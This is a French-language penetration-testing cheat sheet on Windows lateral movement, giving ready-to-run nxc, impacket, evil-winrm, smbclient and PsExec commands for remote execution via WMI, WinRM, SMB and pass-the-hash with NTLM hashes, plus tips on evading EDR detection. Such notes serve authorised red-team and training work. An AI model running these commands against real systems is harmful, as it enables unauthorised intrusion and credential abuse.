# Lateral Movement

## WMI

Exécute des processus à distance via `Win32_Process.Create`. Nécessite d'être membre du groupe **Administrators local** sur la cible (les domain users ne sont pas soumis aux restrictions UAC distantes).

**nxc / impacket-wmiexec (depuis Kali)**

```bash
# nxc
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami"
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method wmiexec

# impacket — shell interactif
impacket-wmiexec corp.com/<user>:<password>@<IP_CIBLE>
```

Ports utilisés par `wmiexec` :
- **135** (DCOM/RPC) — exécution de la commande via WMI
- **445** (SMB/ADMIN$) — récupération de l'output (fichier temporaire sur le partage admin)

Si seul le port **445** est disponible, utiliser `smbexec` — crée un service temporaire via SCM, sans passer par WMI : 
```bash
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
```

**PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`

> Les processus WMI sont créés en **session 0** (isolation système) — invisibles dans la session utilisateur active.

## WinRM

Protocole WS-Management sur TCP **5985** (HTTP) / **5986** (HTTPS). Nécessite d'être membre de **Administrators** ou **Remote Management Users** sur la cible.

**evil-winrm (shell interactif)**

```bash
evil-winrm -i <IP_CIBLE> -u <user> -p <password>
```

**nxc (exécution de commande)**

```bash
nxc winrm <IP_CIBLE> -u <user> -p <password> -X "whoami"
```

**PowerShell (Windows)** : `Enter-PSSession`, `Invoke-Command`, `New-PSSession`

> WinRM souffre du **Kerberos Double Hop** — les credentials ne se propagent pas aux ressources réseau distantes depuis la session. Préférer WMI pour éviter ce problème.

## PsExec

Protocole : **SMB uniquement, port 445**. Nécessite admin local sur la cible + partage ADMIN$ accessible.

Fonctionnement : copie un binaire service (`PSEXESVC.exe`) sur ADMIN$, le démarre via le SCM (Service Control Manager), puis communique via un named pipe dédié.

> Très bruyant : écrit sur le disque, crée un service — détecté par presque tous les EDR. Préférer WMI pour la discrétion.

**impacket-psexec (depuis Kali)**

```bash
impacket-psexec corp.com/<user>:<password>@<IP_CIBLE>
```

**nxc avec smbexec (équivalent psexec via nxc)**

```bash
# smbexec = crée un service pour exécuter la commande, tout via SMB (port 445 uniquement)
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
```

> nxc tente les méthodes dans cet ordre si aucune n'est forcée : `wmiexec` → `atexec` → `smbexec`

**PsExec64.exe Windows — [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)**

```cmd
.\PsExec64.exe -i \\<HOSTNAME> -u corp\<user> -p <password> cmd
```

## Pass the Hash (PtH)

Authentification avec le hash NTLM directement, sans le mot de passe en clair. Fonctionne uniquement avec **NTLM** — pas avec Kerberos.

> Limitation : depuis le patch 2014, PtH ne fonctionne qu'avec le compte **Administrator local intégré** (RID 500) et les comptes de domaine. Les autres comptes admin locaux sont bloqués par défaut.

**NetExec**

```bash
# SMB
nxc smb <IP> -u Administrator -H '<NTLM_HASH>'

# WinRM
nxc winrm <IP> -u Administrator -H '<NTLM_HASH>'

# RDP
nxc rdp <IP> -u Administrator -H '<NTLM_HASH>'

# LDAP
nxc ldap <IP> -u Administrator -H '<NTLM_HASH>'
```

**impacket**

```bash
# shell via WMI
impacket-wmiexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>

# shell via PsExec (crée un service)
impacket-psexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>
```

**smbclient**

```bash
smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash '<NTLM_HASH>'
```

**evil-winrm**

```bash
evil-winrm -i <IP_CIBLE> -u Administrator -H '<NTLM_HASH>'
```

